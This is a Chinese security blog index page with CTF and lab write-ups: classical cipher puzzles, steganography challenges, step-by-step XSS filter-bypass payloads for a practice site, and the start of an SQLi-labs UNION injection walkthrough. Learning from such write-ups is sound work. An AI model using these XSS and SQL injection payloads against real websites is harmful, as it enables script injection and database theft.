<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="支撑一个人走完漫长一生的，是喜爱、擅长与心甘情愿">
<meta property="og:type" content="website">
<meta property="og:title" content="clam">
<meta property="og:url" content="http://yxld.github.io/index.html">
<meta property="og:site_name" content="clam">
<meta property="og:description" content="支撑一个人走完漫长一生的，是喜爱、擅长与心甘情愿">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="clam">
<meta name="twitter:description" content="支撑一个人走完漫长一生的，是喜爱、擅长与心甘情愿">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yxld.github.io/">





  <title>clam</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">clam</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Calm</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/07/14/实验吧—密码学/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/14/实验吧—密码学/" itemprop="url">实验吧——密码学</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-14T18:36:09+08:00">
                2019-07-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>做题平台：实验吧<br>平台网址：<a href="http://www.shiyanbar.com" target="_blank" rel="noopener">http://www.shiyanbar.com</a></p>
<h2 id="围在栅栏中的爱"><a href="#围在栅栏中的爱" class="headerlink" title="围在栅栏中的爱"></a>围在栅栏中的爱</h2><p><img src="https://img-blog.csdnimg.cn/20190714175741694.PNG" alt><br>先拿去摩斯密码解密得到<br><img src="https://img-blog.csdnimg.cn/20190714180123477.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>根据 QWE到底等不等于ABC , 想到密码替换，于是<br><img src="https://img-blog.csdnimg.cn/20190714180230610.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>题目也提示了有栏栅加密，就拿去跑栏栅<br><img src="https://img-blog.csdnimg.cn/20190714180458676.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>再倒序一下就可以了<br><img src="https://img-blog.csdnimg.cn/20190714180515565.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="我喜欢培根"><a href="#我喜欢培根" class="headerlink" title="我喜欢培根"></a>我喜欢培根</h2><p>打开题目连接是一串摩斯密码<br><img src="https://img-blog.csdnimg.cn/20190714181554914.PNG" alt><br>解密后得到<br><img src="https://img-blog.csdnimg.cn/20190714181718820.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>MORSE..–.-IS..–.-COOL..–.-BUT..–.-BACON..–.-IS..–.-COOLER..–.-DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCC/CDCCCDCCDC/CCCDCCDDDCCDDDCCDCDD<br>接下来就是培根密码，这里显示的是C和D，我们可以将C和D转换为ａ和b，这个时候我们只需要将所有的D替换成b，将所有的C替换成a就行了，然后就如下所示：baabaaabbbabaaabbaaaaaaaaabbabaaaabaaaaaabaaabaabaaaabaabbbaabbbaababb<br>解密一下就出来了<br><img src="https://img-blog.csdnimg.cn/20190714181948581.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="困在栅栏里的凯撒"><a href="#困在栅栏里的凯撒" class="headerlink" title="困在栅栏里的凯撒"></a>困在栅栏里的凯撒</h2><p><img src="https://img-blog.csdnimg.cn/20190714182455132.PNG" alt><br>先用栅栏得：NEQ{etlydsf}<br><img src="https://img-blog.csdnimg.cn/20190714182637932.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>再用凯撒暴力得到：CTF{tianshu}<br><img src="https://img-blog.csdnimg.cn/20190714182655313.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/07/11/BUGKU—MISC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/11/BUGKU—MISC/" itemprop="url">BUGKU——MISC</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-11T21:52:22+08:00">
                2019-07-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="杂项一（签到题）"><a href="#杂项一（签到题）" class="headerlink" title="杂项一（签到题）"></a>杂项一（签到题）</h2><p>签到题没什么好说的，关注公众号即可。</p>
<h2 id="杂项二（这是一张单纯的图片）"><a href="#杂项二（这是一张单纯的图片）" class="headerlink" title="杂项二（这是一张单纯的图片）"></a>杂项二（这是一张单纯的图片）</h2><p>保存图片<img src="https://img-blog.csdnimg.cn/20190613200210409.jpg" alt><br>然后用winhex打开发现<br><img src="https://img-blog.csdnimg.cn/2019061320030565.PNG" alt><br>unicode编码转化，在线工具得到flag</p>
<h2 id="杂项三（隐写）"><a href="#杂项三（隐写）" class="headerlink" title="杂项三（隐写）"></a>杂项三（隐写）</h2><p>下载压缩包，打开有一张图片。winhex打开图片发现<br><img src="https://img-blog.csdnimg.cn/20190613200637662.PNG" alt><br>把高改成和宽一样，把A4改成F4，即可得到flag</p>
<h2 id="杂项四（眼见非实）"><a href="#杂项四（眼见非实）" class="headerlink" title="杂项四（眼见非实）"></a>杂项四（眼见非实）</h2><p>下载好文件，文件后缀名改为.zip格式，打开后发现里面有一个名字为眼见非实的文档，打不开，文档格式改为压缩包格式发现好多文件<img src="https://img-blog.csdnimg.cn/20190613203726108.PNG" alt><br>打开word下的document.xml发现<br><img src="https://img-blog.csdnimg.cn/2019061320390062.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="杂项五（啊哒）"><a href="#杂项五（啊哒）" class="headerlink" title="杂项五（啊哒）"></a>杂项五（啊哒）</h2><p>下载后解压发现是一张图片<br><img src="https://img-blog.csdnimg.cn/20190711213520304.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>查看图片属性，发现一串字符<br><img src="https://img-blog.csdnimg.cn/2019071121431389.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>将16进制转换成ASCII码的到<strong>sdnisc_2018</strong><br>将图片格式改为压缩包后发现加密记事本，输入之前的sdnisc_2018可得flag<br><img src="https://img-blog.csdnimg.cn/20190711214615181.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/07/10/WEB—XSS注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/10/WEB—XSS注入/" itemprop="url">WEB——XSS注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-10T23:16:05+08:00">
                2019-07-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p><strong>XSS攻击</strong><br>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。<br><strong>简述</strong><br>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。<br><strong>原理</strong><br>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，<title>与</title>之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。<br>题目网址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="https://img-blog.csdnimg.cn/20190710224705728.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>第一关就用最常用的攻击语句试试。<br>payload:</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710224946766.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="https://img-blog.csdnimg.cn/20190710225017285.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>观察源代码，发现需要把前面的<code>&lt;input&gt;</code>标签给闭合掉。<br>payload：</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710225238516.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><img src="https://img-blog.csdnimg.cn/2019071022534724.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>观察页面源代码，是单引号，在前面加<code>&#39;</code>把<code>value</code>给闭合掉。<br>payload:</p>
<pre><code>&apos; onmouseover=&apos;alert(1)
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710225659315.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><img src="https://img-blog.csdnimg.cn/20190710225715450.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>这里是双引号，在前面输入<code>&quot;</code>，把<code>value</code>给闭合掉。<br>payload:</p>
<pre><code>&quot; onmouseover=&quot;alert(1)
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710225837254.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><img src="https://img-blog.csdnimg.cn/2019071022585297.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>试试script,再看页面源代码，script被过滤了，那就用<a>标签构造攻击语句试试。<br>payload:</a></p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;aa&lt;/a&gt;//
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710230112154.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><img src="https://img-blog.csdnimg.cn/20190710230129581.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>发现<code>href</code>和<code>script</code>都被过滤了，在上题基础上换大写试试。<br>payload:</p>
<pre><code>&quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;&gt;aa&lt;/a&gt;//
</code></pre><p>然后点击<code>aa</code>标签即可。<br><img src="https://img-blog.csdnimg.cn/20190710230246468.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p><img src="https://img-blog.csdnimg.cn/2019071023054419.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>用双写绕过，过滤掉其中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。<br>payload:</p>
<pre><code>&quot;&gt;&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt;
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710230653659.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p><img src="https://img-blog.csdnimg.cn/20190710230826331.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>下面有<code>&lt;a&gt;</code>标签，直接输入这个语句</p>
<pre><code>javascript:alert(/hacker/)
</code></pre><p>但是script会被过滤，换一种方式表达script，采用HTML字符实体转换地址。<br>payload:</p>
<pre><code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710231040908.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p><img src="https://img-blog.csdnimg.cn/20190710231059566.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>又是友情链接，发现输入的语句并没有进入到 <code>&lt;a&gt;</code>标签中，这里应该对格式有一定要求，查看其他博客后发现需要添加<code>http://</code>,否则不合法。<br>payload:</p>
<pre><code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;alert(&apos;http://&apos;)
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710231254896.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p><img src="https://img-blog.csdnimg.cn/2019071023130944.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<p>查看页面源代码，发现<code>t_sort</code>就是注入点，那就开始注入吧，代码中有隐藏的参数设置,把<code>hidden</code>改为<code>text</code>。<br>payload:</p>
<pre><code>&amp;t_sort=8888&quot; type=&quot;text&quot; onmouseover=&quot;alert(666)
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190710231519254.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/06/11/SQLI-LABS（Basic Challenges上）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/11/SQLI-LABS（Basic Challenges上）/" itemprop="url">SQLI-LABS（Basic Challenges上）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-11T20:23:06+08:00">
                2019-06-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近学习一下sql注入，领教一下Sqli-labs的魅力。<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">Sqli-labs下载</a></p>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p><strong>GET-Error based-Single quotes-String(基于错误的GET单引号字符型注入)</strong><br>打开界面：<br><img src="https://img-blog.csdnimg.cn/20190609201529340.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>尝试<code>?id=1</code>:<br><img src="https://img-blog.csdnimg.cn/20190609201600837.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>闭合符号一般是<code>&#39;</code>,<code>&quot;</code>,或<code>无闭合符号</code>或<code>&#39;)</code>，<code>&quot;)</code>；注释符号为<code>--+</code>。<br>尝试<code>?id=1&#39;</code>:<br><img src="https://img-blog.csdnimg.cn/20190609201617691.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>很明显单引号闭合，再<code>?id=1&#39;--+</code>注释掉后面的：<br><img src="https://img-blog.csdnimg.cn/20190609201632440.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>接下来就要判断一下列数<code>?id=1&#39; order by 4--+</code>，发现<br><img src="https://img-blog.csdnimg.cn/20190609201943553.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>一共三列，然后进行联合查询<code>?id=0&#39; union select 1,2,3--+</code>,这里将id等于一个数据库不存在的数，通过联合查询能看出我们输入的数据在哪里能够显示出来<br><img src="https://img-blog.csdnimg.cn/20190609202316985.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>在2，3的位置我们便可插入我们想用的语句了，接下来要做的就是报数据表<br><em>在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。<br>information_schema.columns包含所有表的字段<br>table_schema 数据库名<br>table_name 表名<br>column_name 列名<br>information_schema.tables包含所有库的表名<br>table_schema 数据库名<br>table_name 表名<br>information_schema.schemata包含所有数据库的名<br>schema_name 数据库名<br>group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</em></p>
<pre><code>?id=0&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190609203115822.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
